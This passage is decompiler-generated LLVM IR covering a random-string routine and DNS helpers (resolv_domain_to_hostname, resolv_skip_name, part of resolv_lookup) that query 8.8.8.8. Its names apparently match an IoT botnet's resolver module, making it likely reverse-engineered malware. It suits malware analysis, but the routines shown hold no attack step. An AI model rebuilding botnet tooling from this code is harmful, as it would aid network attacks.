  %stack_var_-68.116 = phi i8* [ %str, %dec_label_pc_155e4.lr.ph ], [ %stack_var_-68.1.be, %dec_label_pc_156d4.backedge ]
  %tmp = icmp ult i32 %stack_var_-72.017, 4
  %v0_1567c = call i32 @rand_next()
  br i1 %tmp, label %dec_label_pc_1567c, label %dec_label_pc_15608.lr.ph

dec_label_pc_15608.lr.ph:                         ; preds = %dec_label_pc_155e4
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_15608.lr.ph, %dec_label_pc_15608
  %storemerge612 = phi i32 [ 0, %dec_label_pc_15608.lr.ph ], [ %v1_15658, %dec_label_pc_15608 ]
  %entropy_-24.011 = phi i32 [ %v0_1567c, %dec_label_pc_15608.lr.ph ], [ %v3_15614, %dec_label_pc_15608 ]
  %stack_var_-68.010 = phi i8* [ %stack_var_-68.116, %dec_label_pc_15608.lr.ph ], [ %v5_15650, %dec_label_pc_15608 ]
  %v3_15614 = udiv i32 %entropy_-24.011, 256
  %v4_1561c = udiv i32 %entropy_-24.011, 8
  %v3_15620 = urem i32 %v4_1561c, 32
  %v2_15638 = add i32 %v2_15634, %v3_15620
  %v1_1563c = inttoptr i32 %v2_15638 to i8*
  %v2_1563c = load i8, i8* %v1_1563c, align 1
  %v4_15640 = ptrtoint i8* %stack_var_-68.010 to i32
  store i8 %v2_1563c, i8* %stack_var_-68.010, align 1
  %v1_1564c = add i32 %v4_15640, 1
  %v5_15650 = inttoptr i32 %v1_1564c to i8*
  %v1_15658 = add i32 %storemerge612, 1
  %tmp31 = icmp ult i32 %v1_15658, 4
  br i1 %tmp31, label %dec_label_pc_15608, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15608
  %v1_15670 = add i32 %stack_var_-72.017, -4
  br label %dec_label_pc_156d4.backedge

dec_label_pc_1567c:                               ; preds = %dec_label_pc_155e4
  %v2_156a0.neg = urem i32 %v0_1567c, 33
  %v4_156b4 = ptrtoint i8* %stack_var_-68.116 to i32
  %v1_156b8 = trunc i32 %v2_156a0.neg to i8
  store i8 %v1_156b8, i8* %stack_var_-68.116, align 1
  %v1_156c0 = add i32 %v4_156b4, 1
  %v5_156c4 = inttoptr i32 %v1_156c0 to i8*
  %v1_156cc = add i32 %stack_var_-72.017, -1
  br label %dec_label_pc_156d4.backedge

dec_label_pc_156d4.backedge:                      ; preds = %dec_label_pc_1567c, %dec_label_pc_1566c
  %stack_var_-68.1.be = phi i8* [ %v5_15650, %dec_label_pc_1566c ], [ %v5_156c4, %dec_label_pc_1567c ]
  %stack_var_-72.0.be = phi i32 [ %v1_15670, %dec_label_pc_1566c ], [ %v1_156cc, %dec_label_pc_1567c ]
  %v5_156dc = icmp sgt i32 %stack_var_-72.0.be, 0
  br i1 %v5_156dc, label %dec_label_pc_155e4, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156d4.backedge, %entry
  %v2_156e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_156e4, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %stack_var_-72.017, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15608, { 1, 0 }
  uselistorder label %dec_label_pc_155e4, { 1, 0 }
}

define void @resolv_domain_to_hostname(i8* %dst_hostname, i8* %src_domain) local_unnamed_addr {
entry:
  %tmp11 = ptrtoint i8* %dst_hostname to i32
  %dst_pos_-40 = alloca i8*, align 4
  %v3_156f8 = load i32, i32* @fp, align 4
  store i8* %src_domain, i8** %dst_pos_-40, align 4
  %v3_15710 = call i32 @util_strlen(i8* %src_domain)
  %v1_15718 = add i32 %v3_15710, 1
  %v4_1571c = inttoptr i32 %v1_15718 to i8*
  br label %dec_label_pc_157c0.outer

dec_label_pc_157c0.outer:                         ; preds = %dec_label_pc_15770, %entry
  %lbl_-32.0.ph = phi i8* [ %v4_157dc, %dec_label_pc_15770 ], [ %v4_1571c, %entry ]
  %dst_pos_-28.0.ph = phi i8* [ %dst_pos_-24.0, %dec_label_pc_15770 ], [ %dst_hostname, %entry ]
  %dst_pos_-24.0.in.ph.in = phi i32 [ %dst_pos_-24.0.in, %dec_label_pc_15770 ], [ %tmp11, %entry ]
  br label %dec_label_pc_157c0

dec_label_pc_15740:                               ; preds = %dec_label_pc_157c0
  %v3_15740 = load i8*, i8** %dst_pos_-40, align 4
  %v4_15740 = ptrtoint i8* %v3_15740 to i32
  %v2_15744 = load i8, i8* %v3_15740, align 1
  %v1_15750 = add i32 %v4_15740, 1
  %v4_15754 = inttoptr i32 %v1_15750 to i8*
  store i8* %v4_15754, i8** %dst_pos_-40, align 4
  %v7_1575c = icmp eq i8 %v2_15744, 46
  br i1 %v7_1575c, label %dec_label_pc_15770, label %dec_label_pc_15764

dec_label_pc_15764:                               ; preds = %dec_label_pc_15740
  %v2_15768 = icmp eq i8 %v2_15744, 0
  br i1 %v2_15768, label %dec_label_pc_15770, label %dec_label_pc_1579c

dec_label_pc_15770:                               ; preds = %dec_label_pc_15764, %dec_label_pc_15740
  store i8 %curr_len_-18.0, i8* %dst_pos_-28.0.ph, align 1
  br label %dec_label_pc_157c0.outer

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15764
  %v1_157a0 = add i8 %curr_len_-18.0, 1
  store i8 %v2_15744, i8* %dst_pos_-24.0, align 1
  br label %dec_label_pc_157c0

dec_label_pc_157c0:                               ; preds = %dec_label_pc_157c0.outer, %dec_label_pc_1579c
  %lbl_-32.0 = phi i8* [ %lbl_-32.0.ph, %dec_label_pc_157c0.outer ], [ %v4_157dc, %dec_label_pc_1579c ]
  %dst_pos_-24.0.in.in = phi i32 [ %dst_pos_-24.0.in.ph.in, %dec_label_pc_157c0.outer ], [ %dst_pos_-24.0.in, %dec_label_pc_1579c ]
  %curr_len_-18.0 = phi i8 [ 0, %dec_label_pc_157c0.outer ], [ %v1_157a0, %dec_label_pc_1579c ]
  %dst_pos_-24.0.in = add i32 %dst_pos_-24.0.in.in, 1
  %dst_pos_-24.0 = inttoptr i32 %dst_pos_-24.0.in to i8*
  %v4_157c0 = ptrtoint i8* %lbl_-32.0 to i32
  %tmp24 = icmp sgt i8* %lbl_-32.0, null
  %v1_157d8 = add i32 %v4_157c0, -1
  %v4_157dc = inttoptr i32 %v1_157d8 to i8*
  %v2_157e0 = icmp eq i1 %tmp24, false
  br i1 %v2_157e0, label %dec_label_pc_157e8, label %dec_label_pc_15740

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157c0
  store i8 0, i8* %dst_pos_-24.0, align 1
  store i32 %v3_156f8, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %dst_pos_-24.0.in, { 1, 0, 2 }
  uselistorder i8* %lbl_-32.0, { 1, 0 }
  uselistorder i8* %src_domain, { 1, 0 }
  uselistorder label %dec_label_pc_157c0, { 1, 0 }
}

define void @resolv_skip_name(i8* %reader, i8* %buffer, i32* %count) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i8* %buffer to i32
  store i32 %tmp9, i32* @r1, align 4
  store i32 1, i32* %count, align 4
  %v2_158b43 = load i8, i8* %reader, align 1
  %v2_158b85 = icmp eq i8 %v2_158b43, 0
  br i1 %v2_158b85, label %dec_label_pc_158c0, label %dec_label_pc_15834.lr.ph

dec_label_pc_15834.lr.ph:                         ; preds = %entry
  %tmp10 = ptrtoint i8* %reader to i32
  %v2_15870 = add i32 %tmp9, -1
  br label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_15834.lr.ph, %dec_label_pc_158b0.backedge
  %v1_158b48 = phi i8* [ %reader, %dec_label_pc_15834.lr.ph ], [ %v1_158b4, %dec_label_pc_158b0.backedge ]
  %jumped_-28.17 = phi i32 [ %tmp10, %dec_label_pc_15834.lr.ph ], [ %v1_15888, %dec_label_pc_158b0.backedge ]
  %offset_-24.16 = phi i32 [ 0, %dec_label_pc_15834.lr.ph ], [ %offset_-24.1.be, %dec_label_pc_158b0.backedge ]
  %v2_15838 = load i8, i8* %v1_158b48, align 1
  %tmp = icmp ult i8 %v2_15838, -64
  br i1 %tmp, label %dec_label_pc_15884, label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15834
  %v2_15848 = load i8, i8* %v1_158b48, align 1
  %v3_15848 = zext i8 %v2_15848 to i32
  %v3_1584c = mul nuw nsw i32 %v3_15848, 256
  %v1_15854 = add i32 %jumped_-28.17, 1
  %v1_15858 = inttoptr i32 %v1_15854 to i8*
  %v2_15858 = load i8, i8* %v1_15858, align 1
  %v3_15858 = zext i8 %v2_15858 to i32
  %v2_1585c = or i32 %v3_15858, -49152
  %v1_15860 = add nsw i32 %v2_1585c, %v3_1584c
  %v1_15874 = add i32 %v2_15870, %v1_15860
  br label %dec_label_pc_15884

dec_label_pc_15884:                               ; preds = %dec_label_pc_15834, %dec_label_pc_15844
  %offset_-24.0 = phi i32 [ %offset_-24.16, %dec_label_pc_15834 ], [ 1, %dec_label_pc_15844 ]
  %jumped_-28.0 = phi i32 [ %jumped_-28.17, %dec_label_pc_15834 ], [ %v1_15874, %dec_label_pc_15844 ]
  %v1_15888 = add i32 %jumped_-28.0, 1
  %v2_15894 = icmp eq i32 %offset_-24.0, 0
  br i1 %v2_15894, label %dec_label_pc_1589c, label %dec_label_pc_158b0.backedge

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15884
  %v2_158a0 = load i32, i32* %count, align 4
  %v1_158a4 = add i32 %v2_158a0, 1
  store i32 %v1_158a4, i32* %count, align 4
  br label %dec_label_pc_158b0.backedge

dec_label_pc_158b0.backedge:                      ; preds = %dec_label_pc_1589c, %dec_label_pc_15884
  %offset_-24.1.be = phi i32 [ 0, %dec_label_pc_1589c ], [ %offset_-24.0, %dec_label_pc_15884 ]
  %v1_158b4 = inttoptr i32 %v1_15888 to i8*
  %v2_158b4 = load i8, i8* %v1_158b4, align 1
  %v2_158b8 = icmp eq i8 %v2_158b4, 0
  br i1 %v2_158b8, label %dec_label_pc_158c0, label %dec_label_pc_15834

dec_label_pc_158c0:                               ; preds = %dec_label_pc_158b0.backedge, %entry
  %offset_-24.1.lcssa = phi i32 [ 0, %entry ], [ %offset_-24.1.be, %dec_label_pc_158b0.backedge ]
  %v7_158c4 = icmp eq i32 %offset_-24.1.lcssa, 1
  br i1 %v7_158c4, label %dec_label_pc_158cc, label %dec_label_pc_158e0

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158c0
  %v2_158d0 = load i32, i32* %count, align 4
  %v1_158d4 = add i32 %v2_158d0, 1
  store i32 %v1_158d4, i32* %count, align 4
  br label %dec_label_pc_158e0

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158c0, %dec_label_pc_158cc
  ret void

; uselistorder directives
  uselistorder i8* %v1_158b4, { 1, 0 }
  uselistorder i8* %v1_158b48, { 1, 0 }
  uselistorder i8* %reader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_158e0, { 1, 0 }
  uselistorder label %dec_label_pc_15884, { 1, 0 }
  uselistorder label %dec_label_pc_15834, { 1, 0 }
}

define i32 @resolv_lookup(i8* %domain) local_unnamed_addr {
entry:
  %tmp_buf_-4224 = alloca i32, align 4
  %tmpcast = bitcast i32* %tmp_buf_-4224 to [4 x i8]*
  %stop_-4220 = alloca i32, align 4
  %response_-4192 = alloca [2048 x i8], align 2
  %timeo_-4216 = alloca %timeval_2, align 8
  %dnsa_-4352 = alloca i32, align 4
  %addr_-4208 = alloca i32, align 4
  %query_-2144 = alloca [2048 x i8], align 2
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 88312, i32* %stack_var_-4, align 4
  %v2_158f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_158f4, i32* @fp, align 4
  %v2_15908 = ptrtoint i32* %stack_var_-24 to i32
  %v2_15918 = call i32 @calloc(i32 1, i32 8)
  %v2_1592c = ptrtoint [2048 x i8]* %query_-2144 to i32
  %v1_15938 = add i32 %v2_1592c, 12
  %v4_15948 = inttoptr i32 %v1_15938 to i8*
  call void @resolv_domain_to_hostname(i8* %v4_15948, i8* %domain)
  %v3_1595c = call i32 @util_strlen(i8* %v4_15948)
  %v2_1596c = add i32 %v3_1595c, %v1_15938
  %v1_15970 = add i32 %v2_1596c, 1
  %v3_15984 = ptrtoint i32* %addr_-4208 to i32
  store i32 0, i32* %addr_-4208, align 4
  %v3_159b8 = call i32 @util_strlen(i8* %v4_15948)
  %v1_159c0 = add i32 %v3_159b8, 17
  %v0_159e0 = call i32 @rand_next()
  %tmp = udiv i32 %v0_159e0, 65535
  %sext108 = shl i32 %tmp, 16
  %v4_15a04 = ashr exact i32 %sext108, 16
  %tmp79 = mul i32 %v4_15a04, -65535
  %v2_15a18 = add i32 %tmp79, %v0_159e0
  %v5_15a20 = trunc i32 %v2_15a18 to i16
  %tmp80 = bitcast i32* %addr_-4208 to i8*
  call void @util_zero(i8* %tmp80, i32 16)
  store i32 2, i32* %addr_-4208, align 4
  %v1_15a68 = call i32 @__GI_htonl(i32 134744072)
  %v1_15a90 = call i32 @__GI_htons(i32 53)
  %sext = mul i32 %v1_15a90, 65536
  %v1_15a94 = sdiv i32 %sext, 65536
  store i32 %v1_15a94, i32* @r1, align 4
  %v3_15ac0 = bitcast [2048 x i8]* %query_-2144 to i16*
  store i16 %v5_15a20, i16* %v3_15ac0, align 2
  %v1_15ac8 = call i32 @__GI_htons(i32 256)
  %sext5 = mul i32 %v1_15ac8, 65536
  %v1_15acc = sdiv i32 %sext5, 65536
  %v1_15ad8 = trunc i32 %v1_15acc to i16
  %v3_15ad8 = add i32 %v2_1592c, 2
  %v4_15ad8 = inttoptr i32 %v3_15ad8 to i16*
  store i16 %v1_15ad8, i16* %v4_15ad8, align 2
  %v1_15ae0 = call i32 @__GI_htons(i32 1)
  %sext6 = mul i32 %v1_15ae0, 65536
  %v1_15ae4 = sdiv i32 %sext6, 65536
  %v1_15af0 = trunc i32 %v1_15ae4 to i16
  %v3_15af0 = add i32 %v2_1592c, 4
  %v4_15af0 = inttoptr i32 %v3_15af0 to i16*
  store i16 %v1_15af0, i16* %v4_15af0, align 2
  %v1_15af8 = call i32 @__GI_htons(i32 1)
  %sext7 = mul i32 %v1_15af8, 65536
  %v1_15afc = sdiv i32 %sext7, 65536
  %v1_15b08 = trunc i32 %v1_15afc to i16
  %v3_15b08 = inttoptr i32 %v1_15970 to i16*
  store i16 %v1_15b08, i16* %v3_15b08, align 2
  %v1_15b10 = call i32 @__GI_htons(i32 1)
  %v1_15b20 = trunc i32 %v1_15b10 to i16
  %v3_15b20 = add i32 %v2_1596c, 3
  %v4_15b20 = inttoptr i32 %v3_15b20 to i16*
  store i16 %v1_15b20, i16* %v4_15b20, align 2
  %v2_15c0c = ptrtoint i32* %dnsa_-4352 to i32
  %v5_15cb4 = getelementptr inbounds %timeval_2, %timeval_2* %timeo_-4216, i32 0, i32 0
  %v3_15cc8 = ptrtoint %timeval_2* %timeo_-4216 to i32
  %v2_15d7c = ptrtoint [2048 x i8]* %response_-4192 to i32
  %v1_15e10 = bitcast [2048 x i8]* %response_-4192 to i16*
  %v1_15dd8 = add i32 %v2_15d7c, 12
  %v4_15de0 = inttoptr i32 %v1_15dd8 to i8*
  %v1_15e24 = add i32 %v2_15d7c, 6
  %v2_15e24 = inttoptr i32 %v1_15e24 to i16*
  br label %dec_label_pc_15b28.lr.ph

dec_label_pc_15b28.lr.ph:                         ; preds = %entry, %dec_label_pc_160c4.outer.backedge
  %v1_160dc8698 = phi i32 [ 1, %entry ], [ %v1_160dc86, %dec_label_pc_160c4.outer.backedge ]
  %v4_15dac97.in = phi i32 [ %v1_15938, %entry ], [ %v1_15dd8, %dec_label_pc_160c4.outer.backedge ]
  %i_-72.0.ph95 = phi i32 [ -1, %entry ], [ %v3_15b48, %dec_label_pc_160c4.outer.backedge ]
  %v4_15dac97 = inttoptr i32 %v4_15dac97.in to i8*
  br label %dec_label_pc_15b28

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b28.lr.ph, %bb.backedge
  %v1_160dc89 = phi i32 [ %v1_160dc8698, %dec_label_pc_15b28.lr.ph ], [ %v1_160dc, %bb.backedge ]
  %i_-72.088 = phi i32 [ %i_-72.0.ph95, %dec_label_pc_15b28.lr.ph ], [ %i_-72.0.be, %bb.backedge ]
  %v7_15b2c = icmp eq i32 %i_-72.088, -1
  br i1 %v7_15b2c, label %dec_label_pc_15b3c, label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b28
  %v1_15b38 = call i32 @__GI___libc_close(i32 %i_-72.088)
  br label %dec_label_pc_15b3c

dec_label_pc_15b3c:                               ; preds = %dec_label_pc_15b28, %dec_label_pc_15b34
  store i32 2, i32* @r1, align 4
  %v3_15b48 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_15b58 = add i32 %v3_15b48, 1
  %v3_15b58 = icmp eq i32 %v3_15b48, -1
  br i1 %v3_15b58, label %dec_label_pc_15b60, label %dec_label_pc_15b6c

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15b3c
  %v1_15b64 = call i32 @sleep(i32 1)
  br label %bb.backedge

bb.backedge:                                      ; preds = %dec_label_pc_15d70, %dec_label_pc_15b60, %dec_label_pc_15b94, %dec_label_pc_15bd0, %dec_label_pc_15d24
  %i_-72.0.be = phi i32 [ -1, %dec_label_pc_15b60 ], [ %v3_15b48, %dec_label_pc_15b94 ], [ %v3_15b48, %dec_label_pc_15bd0 ], [ %v3_15b48, %dec_label_pc_15d24 ], [ %v3_15b48, %dec_label_pc_15d70 ]
  %v7_160d0 = icmp slt i32 %v1_160dc89, 5
  %v1_160dc = add i32 %v1_160dc89, 1
  %v2_160e4 = icmp eq i1 %v7_160d0, false
  br i1 %v2_160e4, label %dec_label_pc_160ec, label %dec_label_pc_15b28

dec_label_pc_15b6c:                               ; preds = %dec_label_pc_15b3c
  %v3_15b84 = call i32 @__libc_connect(i32 %v3_15b48, i32 %v3_15984, i32 16)
  %v3_15b8c = icmp eq i32 %v3_15b84, -1
  br i1 %v3_15b8c, label %dec_label_pc_15b94, label %dec_label_pc_15ba0

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b6c
  %v1_15b98 = call i32 @sleep(i32 1)
  br label %bb.backedge

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15b6c
  %v4_15bc0 = call i32 @__libc_send(i32 %v3_15b48, i32 %v2_1592c, i32 %v1_159c0, i32 16384)
  store i32 %v4_15bc0, i32* @r3, align 4
  %v3_15bc8 = icmp eq i32 %v4_15bc0, -1
  br i1 %v3_15bc8, label %dec_label_pc_15bd0, label %dec_label_pc_15c20.lr.ph

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15ba0
  %v1_15bd4 = call i32 @sleep(i32 1)
  br label %bb.backedge

dec_label_pc_15c20.lr.ph:                         ; preds = %dec_label_pc_15ba0
  store i32 0, i32* @r2, align 4
  %v2_15be8 = call i32 @__libc_fcntl(i32 3, i32 %v3_15b48)
  %v1_15bf0 = or i32 %v2_15be8, 2048
  store i32 %v1_15bf0, i32* @r3, align 4
  store i32 %v1_15bf0, i32* @r2, align 4
  %v2_15c00 = call i32 @__libc_fcntl(i32 4, i32 %v3_15b48)
  br label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c20.lr.ph, %dec_label_pc_15c20
  %v4_15c3c83 = phi i32 [ 0, %dec_label_pc_15c20.lr.ph ], [ %v1_15c34, %dec_label_pc_15c20 ]
  %v5_15c2c = mul i32 %v4_15c3c83, 4
  %v6_15c2c = add i32 %v5_15c2c, %v2_15c0c
  %v7_15c2c = inttoptr i32 %v6_15c2c to i32*
  store i32 0, i32* %v7_15c2c, align 4
  %v1_15c34 = add i32 %v4_15c3c83, 1
  %v4_15c38 = inttoptr i32 %v1_15c34 to %anon_struct_3*
  %v7_15c40 = icmp eq %anon_struct_3* %v4_15c38, inttoptr (i32 31 to %anon_struct_3*)
  %v2_15c44 = icmp ule %anon_struct_3* %v4_15c38, inttoptr (i32 30 to %anon_struct_3*)
  %v3_15c44 = or i1 %v7_15c40, %v2_15c44
  br i1 %v3_15c44, label %dec_label_pc_15c20, label %dec_label_pc_15c48

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c20
  %v3_15c4c = udiv i32 %v3_15b48, 32
  %v3_15c60 = mul nuw nsw i32 %v3_15c4c, 4
  %v2_15c68 = add i32 %v3_15c60, %v2_15908
  %v2_15c6c = add i32 %v2_15c68, -4328
  %v1_15c70 = inttoptr i32 %v2_15c6c to i32*
  %v2_15c70 = load i32, i32* %v1_15c70, align 4
  %v1_15c78 = urem i32 %v3_15b48, 32
  %v6_15c80 = shl i32 1, %v1_15c78
  %v2_15c84 = or i32 %v2_15c70, %v6_15c80
  store i32 %v2_15c84, i32* %v1_15c70, align 4
  store i32 5, i32* %v5_15cb4, align 8
  %v5_15d0c = call i32 @__libc_select(i32 %v2_15b58, i32 %v2_15c0c, i32 0, i32 0, i32 %v3_15cc8)
  %v7_15d1c = icmp eq i32 %v5_15d0c, -1
  br i1 %v7_15d1c, label %dec_label_pc_160ec, label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15c48
  %v2_15d28 = icmp eq i32 %v5_15d0c, 0
  br i1 %v2_15d28, label %bb.backedge, label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d24
  store i32 %v2_15908, i32* @r1, align 4
  %v2_15d50 = load i32, i32* %v1_15c70, align 4
  %v6_15d5c9 = lshr i32 %v2_15d50, %v1_15c78
  %v1_15d64 = urem i32 %v6_15d5c9, 2
  %v2_15d68 = icmp eq i32 %v1_15d64, 0
  br i1 %v2_15d68, label %dec_label_pc_160ec, label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d30
  %v6_15d9c = call i32 @__libc_recvfrom(i32 %v3_15b48, i32 %v2_15d7c, i32 2048, i32 16384, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_15d9c, i32* @r4, align 4
  %v3_15db0 = call i32 @util_strlen(i8* %v4_15dac97)
  %v1_15db8 = add i32 %v3_15db0, 17
  %v0_15dbc = load i32, i32* @r4, align 4
  %v3_15dbc = icmp ult i32 %v0_15dbc, %v1_15db8
  br i1 %v3_15dbc, label %bb.backedge, label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15d70
  %v3_15de4 = call i32 @util_strlen(i8* %v4_15de0)
  %v2_15e10 = load i16, i16* %v1_15e10, align 2
  %v9_15e18 = icmp eq i16 %v5_15a20, %v2_15e10
  br i1 %v9_15e18, label %dec_label_pc_15e20, label %dec_label_pc_160c4.outer.backedge

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15dc4
  %v3_15e24 = load i16, i16* %v2_15e24, align 2
  %v2_15e28 = icmp eq i16 %v3_15e24, 0
  br i1 %v2_15e28, label %dec_label_pc_160c4.outer.backedge, label %dec_label_pc_15e30

dec_label_pc_160c4.outer.backedge:                ; preds = %dec_label_pc_15e20, %dec_label_pc_15dc4
  %v7_160d084 = icmp slt i32 %v1_160dc89, 5
  %v1_160dc86 = add i32 %v1_160dc89, 1
  %v2_160e487 = icmp eq i1 %v7_160d084, false
  br i1 %v2_160e487, label %dec_label_pc_160ec, label %dec_label_pc_15b28.lr.ph

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e20
  %v4_15dd0.le = getelementptr inbounds [2048 x i8], [2048 x i8]* %response_-4192, i32 0, i32 0
  %v3_15e34 = load i16, i16* %v2_15e24, align 2
  %v4_15e34 = zext i16 %v3_15e34 to i32
  %v1_15e3c = call i32 @__GI_ntohs(i32 %v4_15e34)
  %sext11 = mul i32 %v1_15e3c, 65536
  %v1_15e40 = sdiv i32 %sext11, 65536
  %fold = add nsw i32 %v1_15e40, 65535
  %v4_160ac21 = urem i32 %fold, 65536
  %v3_160b822 = icmp eq i32 %v4_160ac21, 65535
  br i1 %v3_160b822, label %dec_label_pc_160ec, label %dec_label_pc_15e4c.lr.ph

dec_label_pc_15e4c.lr.ph:                         ; preds = %dec_label_pc_15e30
  %v1_160a820 = trunc i32 %fold to i16
  %v2_15df4.le = add i32 %v2_15d7c, 17
  %v1_15e04.le = add i32 %v2_15df4.le, %v3_15de4
  %v3_15f74 = ptrtoint i32* %tmp_buf_-4224 to i32
  %v1_15fb0 = add i32 %v2_15918, 4
  %v2_15fb0 = inttoptr i32 %v1_15fb0 to i32*
  %v1_15fb8 = inttoptr i32 %v2_15918 to i8*
  br label %dec_label_pc_15e4c

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e4c.lr.ph, %dec_label_pc_160a0.backedge
  %v1_160a825 = phi i16 [ %v1_160a820, %dec_label_pc_15e4c.lr.ph ], [ %v1_160a8, %dec_label_pc_160a0.backedge ]
  %dnsa_-44.024 = phi i32 [ %v1_15e04.le, %dec_label_pc_15e4c.lr.ph ], [ %dnsa_-44.0.be, %dec_label_pc_160a0.backedge ]
  %v1_15e70 = inttoptr i32 %dnsa_-44.024 to i8*
  call void @resolv_skip_name(i8* %v1_15e70, i8* %v4_15dd0.le, i32* nonnull %stop_-4220)
  %v4_15e8c = load i32, i32* %stop_-4220, align 4
  %v2_15e98 = add i32 %v4_15e8c, %dnsa_-44.024
  %v1_15eac = add i32 %v2_15e98, 10
  %v1_15eb8 = inttoptr i32 %v2_15e98 to i8*
  %v2_15eb8 = load i8, i8* %v1_15eb8, align 1
  %v3_15eb8 = zext i8 %v2_15eb8 to i32
  %v1_15ebc = add i32 %v2_15e98, 1
  %v2_15ebc = inttoptr i32 %v1_15ebc to i8*
  %v3_15ebc = load i8, i8* %v2_15ebc, align 1
  %v4_15ebc = zext i8 %v3_15ebc to i32
  %v3_15ec0 = mul nuw nsw i32 %v4_15ebc, 256
  %v2_15ec4 = or i32 %v3_15ec0, %v3_15eb8
  store i32 %v2_15ec4, i32* @r4, align 4
  %v1_15ed4 = call i32 @__GI_htons(i32 1)
  %v0_15edc = load i32, i32* @r4, align 4
  %v9_15edc = icmp eq i32 %v0_15edc, %v1_15ed4
  br i1 %v9_15edc, label %dec_label_pc_15ee4, label %dec_label_pc_16054

dec_label_pc_15ee4:                               ; preds = %dec_label_pc_15e4c
  %v1_15ee8 = add i32 %v2_15e98, 2
  %v2_15ee8 = inttoptr i32 %v1_15ee8 to i8*
  %v3_15ee8 = load i8, i8* %v2_15ee8, align 1
  %v4_15ee8 = zext i8 %v3_15ee8 to i32
  %v1_15eec = add i32 %v2_15e98, 3
  %v2_15eec = inttoptr i32 %v1_15eec to i8*
  %v3_15eec = load i8, i8* %v2_15eec, align 1
  %v4_15eec = zext i8 %v3_15eec to i32
  %v3_15ef0 = mul nuw nsw i32 %v4_15eec, 256
  %v2_15ef4 = or i32 %v3_15ef0, %v4_15ee8
  store i32 %v2_15ef4, i32* @r4, align 4
  %v1_15f04 = call i32 @__GI_htons(i32 1)
  %v0_15f0c = load i32, i32* @r4, align 4
  %v9_15f0c = icmp eq i32 %v0_15f0c, %v1_15f04
  br i1 %v9_15f0c, label %dec_label_pc_15f14, label %dec_label_pc_16054

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15ee4
  %v1_15f18 = add i32 %v2_15e98, 8
  %v2_15f18 = inttoptr i32 %v1_15f18 to i8*
  %v3_15f18 = load i8, i8* %v2_15f18, align 1
  %v4_15f18 = zext i8 %v3_15f18 to i32
  %v1_15f1c = add i32 %v2_15e98, 9
  %v2_15f1c = inttoptr i32 %v1_15f1c to i8*
  %v3_15f1c = load i8, i8* %v2_15f1c, align 1
  %v4_15f1c = zext i8 %v3_15f1c to i32
  %v3_15f20 = mul nuw nsw i32 %v4_15f1c, 256
  %v2_15f24 = or i32 %v3_15f20, %v4_15f18
  %v1_15f34 = call i32 @__GI_ntohs(i32 %v2_15f24)
  %v7_15f3c = icmp eq i32 %v1_15f34, 4
  br i1 %v7_15f3c, label %dec_label_pc_15f90.preheader, label %dec_label_pc_16018

dec_label_pc_15f90.preheader:                     ; preds = %dec_label_pc_15f14
  br label %dec_label_pc_15f50

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f90.preheader, %dec_label_pc_15f50
  %storemerge1417 = phi i32 [ 0, %dec_label_pc_15f90.preheader ], [ %v1_15f88, %dec_label_pc_15f50 ]
  %v2_15f60 = add i32 %storemerge1417, %v1_15eac
  %v1_15f64 = inttoptr i32 %v2_15f60 to i8*
  %v2_15f64 = load i8, i8* %v1_15f64, align 1
  %v2_15f78 = add nuw nsw i32 %storemerge1417, %v3_15f74
  %v3_15f80 = inttoptr i32 %v2_15f78 to i8*
  store i8 %v2_15f64, i8* %v3_15f80, align 1
  %v1_15f88 = add nuw nsw i32 %storemerge1417, 1
  %v7_15f98 = icmp slt i32 %v1_15f88, 4
  br i1 %v7_15f98, label %dec_label_pc_15f50, label %dec_label_pc_15f9c

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f50
  %v3_15fb0 = load i32, i32* %v2_15fb0, align 4
  %v2_15fb8 = load i8, i8* %v1_15fb8, align 1
  %v3_15fb8 = zext i8 %v2_15fb8 to i32
  %v1_15fbc = mul nuw nsw i32 %v3_15fb8, 4
  %v3_15fc0 = add nuw nsw i32 %v1_15fbc, 4
  %v2_15fcc = inttoptr i32 %v3_15fb0 to i32*
  %v3_15fcc = call i32 @realloc(i32* %v2_15fcc, i32 %v3_15fc0)
  store i32 %v3_15fcc, i32* %v2_15fb0, align 4
  %v2_15fec = load i8, i8* %v1_15fb8, align 1
  %v3_15fec = zext i8 %v2_15fec to i32
